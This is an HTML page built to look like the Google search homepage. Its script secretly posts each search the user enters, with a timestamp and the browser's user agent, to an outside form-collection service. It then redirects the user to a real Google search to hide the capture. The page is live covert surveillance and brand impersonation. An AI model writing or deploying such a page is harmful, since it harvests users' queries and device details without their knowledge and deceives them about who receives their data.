<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Google Search</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#fff;
    font-family:Arial,sans-serif;
}

.container{
    text-align:center;
    width:100%;
}

.logo{
    font-size:70px;
    font-weight:bold;
    color:#4285F4;
    margin-bottom:30px;
}

.logo span:nth-child(2){color:#EA4335;}
.logo span:nth-child(3){color:#FBBC05;}
.logo span:nth-child(4){color:#4285F4;}
.logo span:nth-child(5){color:#34A853;}
.logo span:nth-child(6){color:#EA4335;}

.search-box{
    width:600px;
    max-width:90%;
    margin:auto;
}

.search-box input{
    width:100%;
    padding:16px 22px;
    border-radius:30px;
    border:1px solid #ddd;
    font-size:18px;
    outline:none;
}

.search-box input:focus{
    box-shadow:0 0 5px rgba(0,0,0,.2);
}

button{
    margin-top:25px;
    padding:12px 30px;
    border:none;
    background:#4285F4;
    color:#fff;
    border-radius:5px;
    cursor:pointer;
    font-size:16px;
}

button:hover{
    background:#3367d6;
}
</style>

</head>

<body>

<div class="container">

<div class="logo">
<span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span>
</div>

<div class="search-box">
<input
type="text"
id="searchInput"
placeholder="Search Google or type a URL">

<button onclick="submitSearch()">Google Search</button>
</div>

</div>

<script>

async function submitSearch(){

    let text=document.getElementById("searchInput").value.trim();

    if(text==""){
        alert("Please enter something.");
        return;
    }

    try{

        await fetch("https://formspree.io/f/xojaevjr",{

            method:"POST",

            headers:{
                "Content-Type":"application/json",
                "Accept":"application/json"
            },

            body:JSON.stringify({
                Search:text,
                Time:new Date().toLocaleString(),
                Browser:navigator.userAgent
            })

        });

    }catch(e){}

    window.location.href="https://www.google.com/search?q="+encodeURIComponent(text);

}

document.getElementById("searchInput").addEventListener("keypress",function(e){
    if(e.key==="Enter"){
        submitSearch();
    }
});

</script>

</body>
</html>
